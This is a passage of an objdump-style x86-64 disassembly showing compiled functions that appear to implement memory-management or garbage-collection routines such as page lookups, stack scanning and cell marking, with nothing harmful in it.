    6d8c35b1:	c3                   	ret
    6d8c35b2:	48 89 c8             	mov    %rcx,%rax
    6d8c35b5:	48 39 00             	cmp    %rax,(%rax)
    6d8c35b8:	74 1e                	je     0x6d8c35d8
    6d8c35ba:	48 8b 48 10          	mov    0x10(%rax),%rcx
    6d8c35be:	48 39 ca             	cmp    %rcx,%rdx
    6d8c35c1:	72 06                	jb     0x6d8c35c9
    6d8c35c3:	48 3b 50 18          	cmp    0x18(%rax),%rdx
    6d8c35c7:	72 11                	jb     0x6d8c35da
    6d8c35c9:	48 39 ca             	cmp    %rcx,%rdx
    6d8c35cc:	0f 97 c1             	seta   %cl
    6d8c35cf:	0f b6 c9             	movzbl %cl,%ecx
    6d8c35d2:	48 8b 04 c8          	mov    (%rax,%rcx,8),%rax
    6d8c35d6:	eb dd                	jmp    0x6d8c35b5
    6d8c35d8:	31 c0                	xor    %eax,%eax
    6d8c35da:	c3                   	ret
    6d8c35db:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c35df:	49 89 ca             	mov    %rcx,%r10
    6d8c35e2:	49 89 d1             	mov    %rdx,%r9
    6d8c35e5:	48 c1 fa 0c          	sar    $0xc,%rdx
    6d8c35e9:	48 8d 89 a8 20 00 00 	lea    0x20a8(%rcx),%rcx
    6d8c35f0:	e8 77 e8 ff ff       	call   0x6d8c1e6c
    6d8c35f5:	84 c0                	test   %al,%al
    6d8c35f7:	75 0c                	jne    0x6d8c3605
    6d8c35f9:	31 c9                	xor    %ecx,%ecx
    6d8c35fb:	4d 3b 0a             	cmp    (%r10),%r9
    6d8c35fe:	73 5e                	jae    0x6d8c365e
    6d8c3600:	e9 84 00 00 00       	jmp    0x6d8c3689
    6d8c3605:	4c 89 ca             	mov    %r9,%rdx
    6d8c3608:	31 c9                	xor    %ecx,%ecx
    6d8c360a:	48 81 e2 00 f0 ff ff 	and    $0xfffffffffffff000,%rdx
    6d8c3611:	f6 02 01             	testb  $0x1,(%rdx)
    6d8c3614:	74 73                	je     0x6d8c3689
    6d8c3616:	4c 8b 42 08          	mov    0x8(%rdx),%r8
    6d8c361a:	49 81 f8 c0 0f 00 00 	cmp    $0xfc0,%r8
    6d8c3621:	7e 19                	jle    0x6d8c363c
    6d8c3623:	48 8d 4a 20          	lea    0x20(%rdx),%rcx
    6d8c3627:	49 39 c9             	cmp    %rcx,%r9
    6d8c362a:	72 5b                	jb     0x6d8c3687
    6d8c362c:	48 83 7a 28 01       	cmpq   $0x1,0x28(%rdx)
    6d8c3631:	b8 00 00 00 00       	mov    $0x0,%eax
    6d8c3636:	48 0f 46 c8          	cmovbe %rax,%rcx
    6d8c363a:	eb 4d                	jmp    0x6d8c3689
    6d8c363c:	41 81 e1 ff 0f 00 00 	and    $0xfff,%r9d
    6d8c3643:	31 c9                	xor    %ecx,%ecx
    6d8c3645:	49 8d 41 c0          	lea    -0x40(%r9),%rax
    6d8c3649:	48 3b 42 30          	cmp    0x30(%rdx),%rax
    6d8c364d:	73 3a                	jae    0x6d8c3689
    6d8c364f:	48 8d 4c 02 40       	lea    0x40(%rdx,%rax,1),%rcx
    6d8c3654:	31 d2                	xor    %edx,%edx
    6d8c3656:	49 f7 f0             	div    %r8
    6d8c3659:	48 29 d1             	sub    %rdx,%rcx
    6d8c365c:	eb 22                	jmp    0x6d8c3680
    6d8c365e:	31 c9                	xor    %ecx,%ecx
    6d8c3660:	4d 3b 4a 08          	cmp    0x8(%r10),%r9
    6d8c3664:	77 23                	ja     0x6d8c3689
    6d8c3666:	49 8b 8a a8 28 00 00 	mov    0x28a8(%r10),%rcx
    6d8c366d:	4c 89 ca             	mov    %r9,%rdx
    6d8c3670:	e8 3d ff ff ff       	call   0x6d8c35b2
    6d8c3675:	31 c9                	xor    %ecx,%ecx
    6d8c3677:	48 85 c0             	test   %rax,%rax
    6d8c367a:	74 0d                	je     0x6d8c3689
    6d8c367c:	48 8b 48 10          	mov    0x10(%rax),%rcx
    6d8c3680:	48 83 79 08 01       	cmpq   $0x1,0x8(%rcx)
    6d8c3685:	77 02                	ja     0x6d8c3689
    6d8c3687:	31 c9                	xor    %ecx,%ecx
    6d8c3689:	48 89 c8             	mov    %rcx,%rax
    6d8c368c:	48 83 c4 28          	add    $0x28,%rsp
    6d8c3690:	c3                   	ret
    6d8c3691:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c3695:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
    6d8c369c:	49 89 cb             	mov    %rcx,%r11
    6d8c369f:	76 22                	jbe    0x6d8c36c3
    6d8c36a1:	48 8d 49 68          	lea    0x68(%rcx),%rcx
    6d8c36a5:	e8 31 ff ff ff       	call   0x6d8c35db
    6d8c36aa:	48 85 c0             	test   %rax,%rax
    6d8c36ad:	74 14                	je     0x6d8c36c3
    6d8c36af:	48 83 00 08          	addq   $0x8,(%rax)
    6d8c36b3:	49 8d 4b 30          	lea    0x30(%r11),%rcx
    6d8c36b7:	48 89 c2             	mov    %rax,%rdx
    6d8c36ba:	48 83 c4 28          	add    $0x28,%rsp
    6d8c36be:	e9 2a f6 ff ff       	jmp    0x6d8c2ced
    6d8c36c3:	48 83 c4 28          	add    $0x28,%rsp
    6d8c36c7:	c3                   	ret
    6d8c36c8:	55                   	push   %rbp
    6d8c36c9:	41 54                	push   %r12
    6d8c36cb:	57                   	push   %rdi
    6d8c36cc:	56                   	push   %rsi
    6d8c36cd:	53                   	push   %rbx
    6d8c36ce:	48 89 e5             	mov    %rsp,%rbp
    6d8c36d1:	48 81 ec 20 01 00 00 	sub    $0x120,%rsp
    6d8c36d8:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
    6d8c36dc:	48 8d 8d 00 ff ff ff 	lea    -0x100(%rbp),%rcx
    6d8c36e3:	48 89 ea             	mov    %rbp,%rdx
    6d8c36e6:	e8 bd ae 00 00       	call   0x6d8ce5a8
    6d8c36eb:	85 c0                	test   %eax,%eax
    6d8c36ed:	0f 85 c7 00 00 00    	jne    0x6d8c37ba
    6d8c36f3:	48 8b 45 30          	mov    0x30(%rbp),%rax
    6d8c36f7:	48 8d 9d 00 ff ff ff 	lea    -0x100(%rbp),%rbx
    6d8c36fe:	49 89 ec             	mov    %rbp,%r12
    6d8c3701:	48 8b 38             	mov    (%rax),%rdi
    6d8c3704:	48 89 fe             	mov    %rdi,%rsi
    6d8c3707:	49 39 dc             	cmp    %rbx,%r12
    6d8c370a:	77 06                	ja     0x6d8c3712
    6d8c370c:	48 83 ee 40          	sub    $0x40,%rsi
    6d8c3710:	eb 1f                	jmp    0x6d8c3731
    6d8c3712:	48 8b 13             	mov    (%rbx),%rdx
    6d8c3715:	48 83 c3 08          	add    $0x8,%rbx
    6d8c3719:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    6d8c371d:	e8 6f ff ff ff       	call   0x6d8c3691
    6d8c3722:	48 8b 53 fc          	mov    -0x4(%rbx),%rdx
    6d8c3726:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    6d8c372a:	e8 62 ff ff ff       	call   0x6d8c3691
    6d8c372f:	eb d6                	jmp    0x6d8c3707
    6d8c3731:	48 39 de             	cmp    %rbx,%rsi
    6d8c3734:	76 6d                	jbe    0x6d8c37a3
    6d8c3736:	48 8b 13             	mov    (%rbx),%rdx
    6d8c3739:	48 83 c3 40          	add    $0x40,%rbx
    6d8c373d:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    6d8c3741:	e8 4b ff ff ff       	call   0x6d8c3691
    6d8c3746:	48 8b 53 c8          	mov    -0x38(%rbx),%rdx
    6d8c374a:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    6d8c374e:	e8 3e ff ff ff       	call   0x6d8c3691
    6d8c3753:	48 8b 53 d0          	mov    -0x30(%rbx),%rdx
    6d8c3757:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    6d8c375b:	e8 31 ff ff ff       	call   0x6d8c3691
    6d8c3760:	48 8b 53 d8          	mov    -0x28(%rbx),%rdx
    6d8c3764:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    6d8c3768:	e8 24 ff ff ff       	call   0x6d8c3691
    6d8c376d:	48 8b 53 e0          	mov    -0x20(%rbx),%rdx
    6d8c3771:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    6d8c3775:	e8 17 ff ff ff       	call   0x6d8c3691
    6d8c377a:	48 8b 53 e8          	mov    -0x18(%rbx),%rdx
    6d8c377e:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    6d8c3782:	e8 0a ff ff ff       	call   0x6d8c3691
    6d8c3787:	48 8b 53 f0          	mov    -0x10(%rbx),%rdx
    6d8c378b:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    6d8c378f:	e8 fd fe ff ff       	call   0x6d8c3691
    6d8c3794:	48 8b 53 f8          	mov    -0x8(%rbx),%rdx
    6d8c3798:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    6d8c379c:	e8 f0 fe ff ff       	call   0x6d8c3691
    6d8c37a1:	eb 8e                	jmp    0x6d8c3731
    6d8c37a3:	48 39 df             	cmp    %rbx,%rdi
    6d8c37a6:	72 12                	jb     0x6d8c37ba
    6d8c37a8:	48 8b 13             	mov    (%rbx),%rdx
    6d8c37ab:	48 83 c3 08          	add    $0x8,%rbx
    6d8c37af:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    6d8c37b3:	e8 d9 fe ff ff       	call   0x6d8c3691
    6d8c37b8:	eb e9                	jmp    0x6d8c37a3
    6d8c37ba:	48 81 c4 20 01 00 00 	add    $0x120,%rsp
    6d8c37c1:	5b                   	pop    %rbx
    6d8c37c2:	5e                   	pop    %rsi
    6d8c37c3:	5f                   	pop    %rdi
    6d8c37c4:	41 5c                	pop    %r12
    6d8c37c6:	5d                   	pop    %rbp
    6d8c37c7:	c3                   	ret
    6d8c37c8:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c37cc:	48 8b 41 08          	mov    0x8(%rcx),%rax
    6d8c37d0:	48 8b 40 28          	mov    0x28(%rax),%rax
    6d8c37d4:	48 85 c0             	test   %rax,%rax
    6d8c37d7:	74 14                	je     0x6d8c37ed
    6d8c37d9:	48 ff 05 40 10 10 00 	incq   0x101040(%rip)        # 0x6d9c4820
    6d8c37e0:	48 83 c1 10          	add    $0x10,%rcx
    6d8c37e4:	ff d0                	call   *%rax
    6d8c37e6:	48 ff 0d 33 10 10 00 	decq   0x101033(%rip)        # 0x6d9c4820
    6d8c37ed:	48 83 c4 28          	add    $0x28,%rsp
    6d8c37f1:	c3                   	ret
    6d8c37f2:	57                   	push   %rdi
    6d8c37f3:	56                   	push   %rsi
    6d8c37f4:	53                   	push   %rbx
    6d8c37f5:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c37f9:	48 8d 79 68          	lea    0x68(%rcx),%rdi
    6d8c37fd:	48 89 ce             	mov    %rcx,%rsi
    6d8c3800:	48 83 7e 18 00       	cmpq   $0x0,0x18(%rsi)
    6d8c3805:	7e 46                	jle    0x6d8c384d
    6d8c3807:	48 8b 56 28          	mov    0x28(%rsi),%rdx
    6d8c380b:	48 8b 1a             	mov    (%rdx),%rbx
    6d8c380e:	48 83 23 fb          	andq   $0xfffffffffffffffb,(%rbx)
    6d8c3812:	48 8b 46 18          	mov    0x18(%rsi),%rax
    6d8c3816:	48 8b 4c c2 f8       	mov    -0x8(%rdx,%rax,8),%rcx
    6d8c381b:	48 ff c8             	dec    %rax
    6d8c381e:	48 89 0a             	mov    %rcx,(%rdx)
    6d8c3821:	48 89 46 18          	mov    %rax,0x18(%rsi)
    6d8c3825:	48 83 3b 07          	cmpq   $0x7,(%rbx)
    6d8c3829:	77 d5                	ja     0x6d8c3800
    6d8c382b:	48 89 d9             	mov    %rbx,%rcx
    6d8c382e:	e8 95 ff ff ff       	call   0x6d8c37c8
    6d8c3833:	48 89 d9             	mov    %rbx,%rcx
    6d8c3836:	ba 02 00 00 00       	mov    $0x2,%edx
    6d8c383b:	e8 e8 f9 ff ff       	call   0x6d8c3228
    6d8c3840:	48 89 da             	mov    %rbx,%rdx
    6d8c3843:	48 89 f9             	mov    %rdi,%rcx
    6d8c3846:	e8 55 f3 ff ff       	call   0x6d8c2ba0
    6d8c384b:	eb b3                	jmp    0x6d8c3800
    6d8c384d:	b0 01                	mov    $0x1,%al
    6d8c384f:	48 83 c4 20          	add    $0x20,%rsp
    6d8c3853:	5b                   	pop    %rbx
    6d8c3854:	5e                   	pop    %rsi
    6d8c3855:	5f                   	pop    %rdi
    6d8c3856:	c3                   	ret
    6d8c3857:	56                   	push   %rsi
    6d8c3858:	53                   	push   %rbx
    6d8c3859:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c385d:	48 89 cb             	mov    %rcx,%rbx
    6d8c3860:	48 8b 49 10          	mov    0x10(%rcx),%rcx
    6d8c3864:	48 85 c9             	test   %rcx,%rcx
    6d8c3867:	75 27                	jne    0x6d8c3890
    6d8c3869:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
    6d8c386d:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
    6d8c3874:	00 
    6d8c3875:	e8 67 f4 ff ff       	call   0x6d8c2ce1
    6d8c387a:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
    6d8c3881:	00 
    6d8c3882:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
    6d8c3889:	48 83 c4 28          	add    $0x28,%rsp
    6d8c388d:	5b                   	pop    %rbx
    6d8c388e:	5e                   	pop    %rsi
    6d8c388f:	c3                   	ret
    6d8c3890:	48 8b 31             	mov    (%rcx),%rsi
    6d8c3893:	e8 49 f4 ff ff       	call   0x6d8c2ce1
    6d8c3898:	48 89 f1             	mov    %rsi,%rcx
    6d8c389b:	eb c7                	jmp    0x6d8c3864
    6d8c389d:	53                   	push   %rbx
    6d8c389e:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c38a2:	48 89 cb             	mov    %rcx,%rbx
    6d8c38a5:	e8 ad ff ff ff       	call   0x6d8c3857
    6d8c38aa:	48 89 d9             	mov    %rbx,%rcx
    6d8c38ad:	48 83 c4 20          	add    $0x20,%rsp
    6d8c38b1:	5b                   	pop    %rbx
    6d8c38b2:	e9 21 ee ff ff       	jmp    0x6d8c26d8
    6d8c38b7:	55                   	push   %rbp
    6d8c38b8:	57                   	push   %rdi
    6d8c38b9:	56                   	push   %rsi
    6d8c38ba:	53                   	push   %rbx
    6d8c38bb:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c38bf:	48 83 b9 c8 2b 00 00 	cmpq   $0x0,0x2bc8(%rcx)
    6d8c38c6:	00 
    6d8c38c7:	48 89 ce             	mov    %rcx,%rsi
    6d8c38ca:	75 22                	jne    0x6d8c38ee
    6d8c38cc:	48 8b 05 ed 3c 10 00 	mov    0x103ced(%rip),%rax        # 0x6d9c75c0
    6d8c38d3:	48 8d 2d 66 3f 10 00 	lea    0x103f66(%rip),%rbp        # 0x6d9c7840
    6d8c38da:	31 db                	xor    %ebx,%ebx
    6d8c38dc:	48 8d 78 ff          	lea    -0x1(%rax),%rdi
    6d8c38e0:	48 39 fb             	cmp    %rdi,%rbx
    6d8c38e3:	7f 09                	jg     0x6d8c38ee
    6d8c38e5:	ff 54 dd 00          	call   *0x0(%rbp,%rbx,8)
    6d8c38e9:	48 ff c3             	inc    %rbx
    6d8c38ec:	eb f2                	jmp    0x6d8c38e0
    6d8c38ee:	48 8b 05 eb 3e 10 00 	mov    0x103eeb(%rip),%rax        # 0x6d9c77e0
    6d8c38f5:	48 8d 2d e4 a0 0f 00 	lea    0xfa0e4(%rip),%rbp        # 0x6d9bd9e0
    6d8c38fc:	31 db                	xor    %ebx,%ebx
    6d8c38fe:	48 8d 78 ff          	lea    -0x1(%rax),%rdi
    6d8c3902:	48 39 fb             	cmp    %rdi,%rbx
    6d8c3905:	7e 16                	jle    0x6d8c391d
    6d8c3907:	48 8b 86 b0 2b 00 00 	mov    0x2bb0(%rsi),%rax
    6d8c390e:	31 db                	xor    %ebx,%ebx
    6d8c3910:	48 8b ae c0 2b 00 00 	mov    0x2bc0(%rsi),%rbp
    6d8c3917:	48 8d 78 ff          	lea    -0x1(%rax),%rdi
    6d8c391b:	eb 09                	jmp    0x6d8c3926
    6d8c391d:	ff 54 dd 00          	call   *0x0(%rbp,%rbx,8)
    6d8c3921:	48 ff c3             	inc    %rbx
    6d8c3924:	eb dc                	jmp    0x6d8c3902
    6d8c3926:	48 39 fb             	cmp    %rdi,%rbx
    6d8c3929:	7f 12                	jg     0x6d8c393d
    6d8c392b:	48 8b 54 dd 00       	mov    0x0(%rbp,%rbx,8),%rdx
    6d8c3930:	48 89 f1             	mov    %rsi,%rcx
    6d8c3933:	48 ff c3             	inc    %rbx
    6d8c3936:	e8 a1 f9 ff ff       	call   0x6d8c32dc
    6d8c393b:	eb e9                	jmp    0x6d8c3926
    6d8c393d:	48 83 c4 28          	add    $0x28,%rsp
    6d8c3941:	5b                   	pop    %rbx
    6d8c3942:	5e                   	pop    %rsi
    6d8c3943:	5f                   	pop    %rdi
    6d8c3944:	5d                   	pop    %rbp
    6d8c3945:	c3                   	ret
    6d8c3946:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c394a:	49 89 d2             	mov    %rdx,%r10
    6d8c394d:	48 c1 ea 0c          	shr    $0xc,%rdx
    6d8c3951:	e8 64 f6 ff ff       	call   0x6d8c2fba
    6d8c3956:	31 d2                	xor    %edx,%edx
    6d8c3958:	48 85 c0             	test   %rax,%rax
    6d8c395b:	74 1f                	je     0x6d8c397c
    6d8c395d:	49 c1 ea 04          	shr    $0x4,%r10
    6d8c3961:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8c3966:	41 0f b6 ca          	movzbl %r10b,%ecx
    6d8c396a:	49 89 c8             	mov    %rcx,%r8
    6d8c396d:	48 d3 e2             	shl    %cl,%rdx
    6d8c3970:	49 c1 e8 06          	shr    $0x6,%r8
    6d8c3974:	4a 85 54 c0 10       	test   %rdx,0x10(%rax,%r8,8)
    6d8c3979:	0f 95 c2             	setne  %dl
    6d8c397c:	89 d0                	mov    %edx,%eax
    6d8c397e:	48 83 c4 28          	add    $0x28,%rsp
    6d8c3982:	c3                   	ret
    6d8c3983:	53                   	push   %rbx
    6d8c3984:	48 83 ec 30          	sub    $0x30,%rsp
    6d8c3988:	48 89 cb             	mov    %rcx,%rbx
    6d8c398b:	48 89 d1             	mov    %rdx,%rcx
    6d8c398e:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
    6d8c3993:	e8 30 fe ff ff       	call   0x6d8c37c8
    6d8c3998:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
    6d8c399d:	48 8d 4b 68          	lea    0x68(%rbx),%rcx
    6d8c39a1:	48 83 c4 30          	add    $0x30,%rsp
    6d8c39a5:	5b                   	pop    %rbx
    6d8c39a6:	e9 f5 f1 ff ff       	jmp    0x6d8c2ba0
    6d8c39ab:	41 57                	push   %r15
    6d8c39ad:	41 56                	push   %r14
    6d8c39af:	41 55                	push   %r13
    6d8c39b1:	41 54                	push   %r12
    6d8c39b3:	55                   	push   %rbp
    6d8c39b4:	57                   	push   %rdi
    6d8c39b5:	56                   	push   %rsi
    6d8c39b6:	53                   	push   %rbx
    6d8c39b7:	48 83 ec 48          	sub    $0x48,%rsp
    6d8c39bb:	45 31 e4             	xor    %r12d,%r12d
    6d8c39be:	48 89 cb             	mov    %rcx,%rbx
    6d8c39c1:	c6 81 30 29 00 00 01 	movb   $0x1,0x2930(%rcx)
    6d8c39c8:	4c 8d b1 90 2b 00 00 	lea    0x2b90(%rcx),%r14
    6d8c39cf:	4a 8b b4 e3 10 21 00 	mov    0x2110(%rbx,%r12,8),%rsi
    6d8c39d6:	00 
    6d8c39d7:	48 85 f6             	test   %rsi,%rsi
    6d8c39da:	75 24                	jne    0x6d8c3a00
    6d8c39dc:	49 ff c4             	inc    %r12
    6d8c39df:	49 81 fc 00 01 00 00 	cmp    $0x100,%r12
    6d8c39e6:	75 e7                	jne    0x6d8c39cf
    6d8c39e8:	c6 83 30 29 00 00 00 	movb   $0x0,0x2930(%rbx)
    6d8c39ef:	48 83 c4 48          	add    $0x48,%rsp
    6d8c39f3:	5b                   	pop    %rbx
    6d8c39f4:	5e                   	pop    %rsi
    6d8c39f5:	5f                   	pop    %rdi
    6d8c39f6:	5d                   	pop    %rbp
    6d8c39f7:	41 5c                	pop    %r12
    6d8c39f9:	41 5d                	pop    %r13
    6d8c39fb:	41 5e                	pop    %r14
    6d8c39fd:	41 5f                	pop    %r15
    6d8c39ff:	c3                   	ret
    6d8c3a00:	31 ff                	xor    %edi,%edi
    6d8c3a02:	48 89 f8             	mov    %rdi,%rax
    6d8c3a05:	48 8b 6c fe 10       	mov    0x10(%rsi,%rdi,8),%rbp
    6d8c3a0a:	48 c1 e0 06          	shl    $0x6,%rax
    6d8c3a0e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8c3a13:	48 8d 83 10 21 00 00 	lea    0x2110(%rbx),%rax
    6d8c3a1a:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
    6d8c3a1f:	48 85 ed             	test   %rbp,%rbp
    6d8c3a22:	75 0e                	jne    0x6d8c3a32
    6d8c3a24:	48 ff c7             	inc    %rdi
    6d8c3a27:	48 83 ff 08          	cmp    $0x8,%rdi
    6d8c3a2b:	75 d5                	jne    0x6d8c3a02
    6d8c3a2d:	48 8b 36             	mov    (%rsi),%rsi
    6d8c3a30:	eb a5                	jmp    0x6d8c39d7
    6d8c3a32:	40 f6 c5 01          	test   $0x1,%bpl
    6d8c3a36:	0f 84 9b 00 00 00    	je     0x6d8c3ad7
    6d8c3a3c:	48 8b 56 08          	mov    0x8(%rsi),%rdx
    6d8c3a40:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
    6d8c3a45:	48 c1 e2 09          	shl    $0x9,%rdx
    6d8c3a49:	48 0b 54 24 28       	or     0x28(%rsp),%rdx
    6d8c3a4e:	49 89 d1             	mov    %rdx,%r9
    6d8c3a51:	e8 16 e4 ff ff       	call   0x6d8c1e6c
    6d8c3a56:	84 c0                	test   %al,%al
    6d8c3a58:	74 7d                	je     0x6d8c3ad7
    6d8c3a5a:	4c 89 ca             	mov    %r9,%rdx
    6d8c3a5d:	48 c1 e2 0c          	shl    $0xc,%rdx
    6d8c3a61:	f6 02 01             	testb  $0x1,(%rdx)
    6d8c3a64:	74 71                	je     0x6d8c3ad7
    6d8c3a66:	4c 8b 7a 08          	mov    0x8(%rdx),%r15
    6d8c3a6a:	49 81 ff c0 0f 00 00 	cmp    $0xfc0,%r15
    6d8c3a71:	7e 09                	jle    0x6d8c3a7c
    6d8c3a73:	48 83 7a 28 01       	cmpq   $0x1,0x28(%rdx)
    6d8c3a78:	77 3f                	ja     0x6d8c3ab9
    6d8c3a7a:	eb 5b                	jmp    0x6d8c3ad7
    6d8c3a7c:	48 8b 42 30          	mov    0x30(%rdx),%rax
    6d8c3a80:	4c 8d 6a 40          	lea    0x40(%rdx),%r13
    6d8c3a84:	4c 01 e8             	add    %r13,%rax
    6d8c3a87:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
    6d8c3a8c:	4c 39 6c 24 30       	cmp    %r13,0x30(%rsp)
    6d8c3a91:	76 44                	jbe    0x6d8c3ad7
    6d8c3a93:	49 83 7d 08 01       	cmpq   $0x1,0x8(%r13)
    6d8c3a98:	76 1a                	jbe    0x6d8c3ab4
    6d8c3a9a:	4c 89 ea             	mov    %r13,%rdx
    6d8c3a9d:	4c 89 f1             	mov    %r14,%rcx
    6d8c3aa0:	e8 a1 fe ff ff       	call   0x6d8c3946
    6d8c3aa5:	84 c0                	test   %al,%al
    6d8c3aa7:	75 0b                	jne    0x6d8c3ab4
    6d8c3aa9:	4c 89 ea             	mov    %r13,%rdx
    6d8c3aac:	48 89 d9             	mov    %rbx,%rcx
    6d8c3aaf:	e8 cf fe ff ff       	call   0x6d8c3983
    6d8c3ab4:	4d 01 fd             	add    %r15,%r13
    6d8c3ab7:	eb d3                	jmp    0x6d8c3a8c
    6d8c3ab9:	4c 8d 5a 20          	lea    0x20(%rdx),%r11
    6d8c3abd:	4c 89 f1             	mov    %r14,%rcx
    6d8c3ac0:	4c 89 da             	mov    %r11,%rdx
    6d8c3ac3:	e8 7e fe ff ff       	call   0x6d8c3946
    6d8c3ac8:	84 c0                	test   %al,%al
    6d8c3aca:	75 0b                	jne    0x6d8c3ad7
    6d8c3acc:	4c 89 da             	mov    %r11,%rdx
    6d8c3acf:	48 89 d9             	mov    %rbx,%rcx
    6d8c3ad2:	e8 ac fe ff ff       	call   0x6d8c3983
    6d8c3ad7:	48 ff 44 24 28       	incq   0x28(%rsp)
    6d8c3adc:	48 d1 ed             	shr    $1,%rbp
    6d8c3adf:	e9 3b ff ff ff       	jmp    0x6d8c3a1f
    6d8c3ae4:	55                   	push   %rbp
    6d8c3ae5:	57                   	push   %rdi
    6d8c3ae6:	56                   	push   %rsi
    6d8c3ae7:	53                   	push   %rbx
    6d8c3ae8:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c3aec:	48 89 cb             	mov    %rcx,%rbx
    6d8c3aef:	48 83 7b 18 00       	cmpq   $0x0,0x18(%rbx)
    6d8c3af4:	7f 1c                	jg     0x6d8c3b12
    6d8c3af6:	48 8d 8b 90 2b 00 00 	lea    0x2b90(%rbx),%rcx
    6d8c3afd:	31 f6                	xor    %esi,%esi
    6d8c3aff:	e8 99 fd ff ff       	call   0x6d8c389d
    6d8c3b04:	48 8b 43 30          	mov    0x30(%rbx),%rax
    6d8c3b08:	48 8b 6b 40          	mov    0x40(%rbx),%rbp
    6d8c3b0c:	48 8d 78 ff          	lea    -0x1(%rax),%rdi
    6d8c3b10:	eb 1a                	jmp    0x6d8c3b2c
    6d8c3b12:	48 89 d9             	mov    %rbx,%rcx
    6d8c3b15:	e8 d8 fc ff ff       	call   0x6d8c37f2
    6d8c3b1a:	eb d3                	jmp    0x6d8c3aef
    6d8c3b1c:	48 8b 54 f5 00       	mov    0x0(%rbp,%rsi,8),%rdx
    6d8c3b21:	48 89 d9             	mov    %rbx,%rcx
    6d8c3b24:	48 ff c6             	inc    %rsi
    6d8c3b27:	e8 b0 f7 ff ff       	call   0x6d8c32dc
    6d8c3b2c:	48 39 fe             	cmp    %rdi,%rsi
    6d8c3b2f:	7e eb                	jle    0x6d8c3b1c
    6d8c3b31:	48 89 d9             	mov    %rbx,%rcx
    6d8c3b34:	e8 7e fd ff ff       	call   0x6d8c38b7
    6d8c3b39:	48 89 d9             	mov    %rbx,%rcx
    6d8c3b3c:	48 83 c4 28          	add    $0x28,%rsp
    6d8c3b40:	5b                   	pop    %rbx
    6d8c3b41:	5e                   	pop    %rsi
    6d8c3b42:	5f                   	pop    %rdi
    6d8c3b43:	5d                   	pop    %rbp
    6d8c3b44:	e9 62 fe ff ff       	jmp    0x6d8c39ab
    6d8c3b49:	48 8b 05 70 2d 10 00 	mov    0x102d70(%rip),%rax        # 0x6d9c68c0
    6d8c3b50:	c3                   	ret
    6d8c3b51:	55                   	push   %rbp
    6d8c3b52:	57                   	push   %rdi
    6d8c3b53:	56                   	push   %rsi
    6d8c3b54:	53                   	push   %rbx
    6d8c3b55:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c3b59:	31 db                	xor    %ebx,%ebx
    6d8c3b5b:	48 8b 41 30          	mov    0x30(%rcx),%rax
    6d8c3b5f:	48 8b 69 40          	mov    0x40(%rcx),%rbp
    6d8c3b63:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
    6d8c3b67:	48 89 cf             	mov    %rcx,%rdi
    6d8c3b6a:	48 39 f3             	cmp    %rsi,%rbx
    6d8c3b6d:	7e 11                	jle    0x6d8c3b80
    6d8c3b6f:	48 c7 47 30 00 00 00 	movq   $0x0,0x30(%rdi)
    6d8c3b76:	00 
    6d8c3b77:	48 83 c4 28          	add    $0x28,%rsp
    6d8c3b7b:	5b                   	pop    %rbx
    6d8c3b7c:	5e                   	pop    %rsi
    6d8c3b7d:	5f                   	pop    %rdi
    6d8c3b7e:	5d                   	pop    %rbp
    6d8c3b7f:	c3                   	ret
    6d8c3b80:	48 8b 4c dd 00       	mov    0x0(%rbp,%rbx,8),%rcx
    6d8c3b85:	48 ff c3             	inc    %rbx
    6d8c3b88:	e8 f2 f1 ff ff       	call   0x6d8c2d7f
    6d8c3b8d:	eb db                	jmp    0x6d8c3b6a
    6d8c3b8f:	53                   	push   %rbx
    6d8c3b90:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c3b94:	48 89 cb             	mov    %rcx,%rbx
    6d8c3b97:	e8 dd f9 ff ff       	call   0x6d8c3579
    6d8c3b9c:	4c 8b 83 10 29 00 00 	mov    0x2910(%rbx),%r8
    6d8c3ba3:	48 39 83 70 2b 00 00 	cmp    %rax,0x2b70(%rbx)
    6d8c3baa:	48 0f 4d 83 70 2b 00 	cmovge 0x2b70(%rbx),%rax
    6d8c3bb1:	00 
    6d8c3bb2:	4c 89 c1             	mov    %r8,%rcx
    6d8c3bb5:	48 89 83 70 2b 00 00 	mov    %rax,0x2b70(%rbx)
    6d8c3bbc:	e8 c1 f9 ff ff       	call   0x6d8c3582
    6d8c3bc1:	4c 89 c1             	mov    %r8,%rcx
    6d8c3bc4:	48 89 43 68          	mov    %rax,0x68(%rbx)
    6d8c3bc8:	e8 c9 f9 ff ff       	call   0x6d8c3596
    6d8c3bcd:	48 89 d9             	mov    %rbx,%rcx
    6d8c3bd0:	48 89 43 70          	mov    %rax,0x70(%rbx)
    6d8c3bd4:	e8 ef fa ff ff       	call   0x6d8c36c8
    6d8c3bd9:	48 8b 43 30          	mov    0x30(%rbx),%rax
